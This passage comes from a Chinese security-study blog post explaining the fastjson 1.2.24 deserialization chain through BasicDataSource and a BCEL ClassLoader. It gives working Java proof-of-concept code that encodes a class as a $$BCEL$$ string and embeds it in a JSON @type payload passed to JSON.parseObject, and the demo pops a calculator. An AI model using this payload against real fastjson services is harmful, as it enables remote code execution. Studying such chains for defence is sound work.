class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>); <span class="comment">// 满足代码里面的判断条件</span></span><br><span class="line">        classLoader.loadClass(<span class="string">&quot;$$BCEL$$&quot;</span>+code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是运行成功会弹计算器的</p>
<p>所以找到类<code>BasicDataSource#createConnectionFactory()</code>方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420155112.png" ></p>
<p>如果<code>driverClassLoader</code>不为空就会forName加载driverClassName和driverClassLoader，forName底层也会调用loadClass，所以现在看这两个参数是不是可控的，如果可以就把<strong>driverClassLoader</strong>指定成<code>org.apache.bcel.util.ClassLoader</code>，把<strong>driverClassName</strong>加载成恶意的字节码，从而实现恶意代码</p>
<p>当然是可控的，都有对应的setter</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420155722.png" ></p>
<p>那现在就看有哪里调用<code>createConnectionFactory()</code>方法，链子是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BasicDataSource.getConnection()</span><br><span class="line">	-&gt; createDataSource().getConnection()</span><br><span class="line">		-&gt;this.createConnectionFactory()</span><br></pre></td></tr></table></figure>

<p>先尝试直接调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        classLoader.loadClass(&quot;$$BCEL$$&quot;+code).newInstance();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">basicDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();</span><br><span class="line">        basicDataSource.setDriverClassName(<span class="string">&quot;$$BCEL$$&quot;</span>+code);</span><br><span class="line">        basicDataSource.setDriverClassLoader(classLoader);</span><br><span class="line">        basicDataSource.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在也是可以弹计算器</p>
<p>下面引入fastjson反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        classLoader.loadClass(&quot;$$BCEL$$&quot;+code).newInstance();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        BasicDataSource basicDataSource = new BasicDataSource();</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassName(&quot;$$BCEL$$&quot;+code);</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassLoader(classLoader);</span></span><br><span class="line"><span class="comment">//        basicDataSource.getConnection();</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 修正的JSON字符串格式</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+ code + <span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.apache.bcel.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里要用parseObject才可以，因为要用到getter方法，parseObject里面parse后有toJson才会调用到getter方法</p>
<p>这个链子大概就是这样。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>【fastjson反序列化漏洞2-1.2.24利用】<a class="link"   href="https://www.bilibili.com/video/BV1pP411N726?vd_source=46e5237289ae6c1a3c7bcab6091e42a6" >https://www.bilibili.com/video/BV1pP411N726?vd_source=46e5237289ae6c1a3c7bcab6091e42a6<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" >https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>前面讲到的利用还是套上了以前的知识，这次是用json字符串去触发反序列化，所以要先理解好前面的内容，相对来说结合jndi注入的利益链比较常见</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习</tag>
      </tags>
  </entry>
</search>
